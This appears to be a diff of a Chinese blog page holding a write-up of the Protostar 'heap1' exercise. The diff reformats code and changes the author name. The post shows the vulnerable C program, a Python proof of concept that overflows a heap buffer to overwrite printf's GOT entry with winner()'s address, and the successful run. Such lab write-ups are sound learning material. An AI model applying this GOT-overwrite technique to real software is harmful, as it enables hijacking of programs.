@@ -19,7 +19,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="0x00 序现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。
 0x01 heap1C代码
-123456789101112131415161718192021222324252627282930313233#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdi">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+
+struct internet">
 <meta name="keywords">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Protostar-堆溢出系列学习-heap 1">
@@ -27,7 +33,13 @@
 <meta property="og:site_name" content="4ch12dy">
 <meta property="og:description" content="0x00 序现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。
 0x01 heap1C代码
-123456789101112131415161718192021222324252627282930313233#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdi">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+
+struct internet">
 <meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/md_source/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-0.png">
 <meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/md_source/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-1.png">
 <meta property="og:updated_time" content="2017-04-21T01:21:34.000Z">
@@ -35,7 +47,13 @@
 <meta name="twitter:title" content="Protostar-堆溢出系列学习-heap 1">
 <meta name="twitter:description" content="0x00 序现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。
 0x01 heap1C代码
-123456789101112131415161718192021222324252627282930313233#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdi">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+
+struct internet">
 <meta name="twitter:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/md_source/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-0.png">
   
     <link rel="alternate" href="/atom.xml" title="4ch12dy" type="application/atom+xml">
@@ -43,8 +61,6 @@
   
     <link rel="icon" href="/favicon.png">
   
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
   <link rel="stylesheet" href="../../../../css/common.css">
 <link rel="stylesheet" href="../../../../css/nav.css">
@@ -59,7 +75,7 @@
     <nav class="nav">
          <div class="nav-left">
             <a href="/" class="nav-item" style="font-size: 20px;">
-              <span class="logo">Diskobólos</span>'s Blog
+              <span class="logo">xia0</span>'s Blog
             </a>
          </div>
         <div class="nav-center is-hidden position-relative" id="search_container">
@@ -83,7 +99,7 @@
                 My Works
             </a>
             
-            <a class="nav-item" href="../../../../about">
+            <a class="nav-item" href="../../../../aboutme">
                 About
             </a>
             
@@ -103,7 +119,7 @@
                 My Works
             </a>
             
-            <a class="nav-item flex-1" href="../../../../about">
+            <a class="nav-item flex-1" href="../../../../aboutme">
                 About
             </a>
             
@@ -158,7 +174,7 @@
             
             <div class="is-flex align-center">
                 <img class="post-avatar" src="https://cdn2.iconfinder.com/data/icons/rcons-user/32/male-shadow-circle-512.png">
-                <span style="padding:0 10px;"> <span class="sub-title">By</span> Diskobólos</span>
+                <span style="padding:0 10px;"> <span class="sub-title">By</span> xia0</span>
                 <span class="post-date sub-title">at: 2017-04-10</span>
             </div>
             
@@ -176,13 +192,51 @@
         <div class="content" style="overflow: auto">
             <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>现在我们来学习一下利用堆溢出修改GOT表达到代码劫持的列子。</p>
 <h2 id="0x01-heap1"><a href="#0x01-heap1" class="headerlink" title="0x01 heap1"></a>0x01 heap1</h2><p>C代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">struct internet &#123;</div><div class="line">  int priority;</div><div class="line">  char *name;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">void winner()</div><div class="line">&#123;</div><div class="line">  printf(&quot;and we have a winner @ %d\n&quot;, time(NULL));</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  struct internet *i1, *i2, *i3;</div><div class="line"></div><div class="line">  i1 = malloc(sizeof(struct internet));</div><div class="line">  i1-&gt;priority = 1;</div><div class="line">  i1-&gt;name = malloc(8);</div><div class="line"></div><div class="line">  i2 = malloc(sizeof(struct internet));</div><div class="line">  i2-&gt;priority = 2;</div><div class="line">  i2-&gt;name = malloc(8);</div><div class="line"></div><div class="line">  strcpy(i1-&gt;name, argv[1]);</div><div class="line">  strcpy(i2-&gt;name, argv[2]);</div><div class="line"></div><div class="line">  printf(&quot;and that&apos;s a wrap folks!\n&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+
+struct internet {
+  int priority;
+  char *name;
+};
+
+void winner()
+{
+  printf(&quot;and we have a winner @ %d\n&quot;, time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  struct internet *i1, *i2, *i3;
+
+  i1 = malloc(sizeof(struct internet));
+  i1-&gt;priority = 1;
+  i1-&gt;name = malloc(8);
+
+  i2 = malloc(sizeof(struct internet));
+  i2-&gt;priority = 2;
+  i2-&gt;name = malloc(8);
+
+  strcpy(i1-&gt;name, argv[1]);
+  strcpy(i2-&gt;name, argv[2]);
+
+  printf(&quot;and that&#39;s a wrap folks!\n&quot;);
+}
+</code></pre><h2 id="0x02-简单的分析-amp-思考"><a href="#0x02-简单的分析-amp-思考" class="headerlink" title="0x02 简单的分析&amp;思考"></a>0x02 简单的分析&amp;思考</h2><p>如果之前没有相关的漏洞利用经验的话，一时还是想不到怎么去利用这个堆溢出漏洞。但这里有两个<code>strcpy</code>，肯定是要去覆盖和修改某个地方的地址。<br>其实<code>strcpy</code>这个函数是非常危险的，既能溢出，又能对任意地址进行写操作。<br>在这个列子中，我们就借此去修改<code>printf</code>函数的GOT表。</p>
 <h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.查看堆分配情况<br><img src="/4ch12dy/4ch12dy.github.io.git/md_source/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-0.png" alt="0-0"><br>2.查看汇编代码，找到执行入口<br><img src="/4ch12dy/4ch12dy.github.io.git/md_source/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap 1/king/4chendyBlog/paper/stackBufferOverflow/Protostar-堆溢出系列学习-heap/ 1/0-1.png" alt="0-1"><br>3.首先利用第一个<code>strcpy</code>将i2的name指针改为GOT表地址，然后利用第二个<code>strcpy</code>向这个地址写入<code>winner</code>的地址，由此编写对应的Python PoC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import struct</div><div class="line">padding = &quot;AAAA&quot;*5</div><div class="line">put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址</div><div class="line">space = &quot; &quot;</div><div class="line">winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址</div><div class="line">print padding+put_got+space+winner</div></pre></td></tr></table></figure>
-<p>4.hack</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@protostar:/tmp$ /opt/protostar/bin/heap1 `python  heap1.py`</div><div class="line">and we have a winner @ 1492452139</div></pre></td></tr></table></figure>
-<p><strong>成功执行winner函数</strong></p>
+<pre><code>import struct
+padding = &quot;AAAA&quot;*5
+put_got = struct.pack(&quot;I&quot;, 0x8049774) #put的GOT表地址
+space = &quot; &quot;
+winner = struct.pack(&quot;I&quot;, 0x8048494) #winner函数地址
+print padding+put_got+space+winner
+</code></pre><p>4.hack</p>
+<pre><code>user@protostar:/tmp$ /opt/protostar/bin/heap1 `python  heap1.py`
+and we have a winner @ 1492452139
+</code></pre><p><strong>成功执行winner函数</strong></p>
 <h1 id="0x04-一点感受"><a href="#0x04-一点感受" class="headerlink" title="0x04 一点感受"></a>0x04 一点感受</h1><p>学到现在，感受很多，对用户输入的数据完全信任是多么的可怕。可能有一万种的方法去利用这个漏洞达到代码执行。比如这里，将<code>strcpy</code>改为<code>strncpy</code>或者在copy前先检查下长度的话就能避免。所以写好一个有质量的代码是多么重要。</p>
 
         </div>
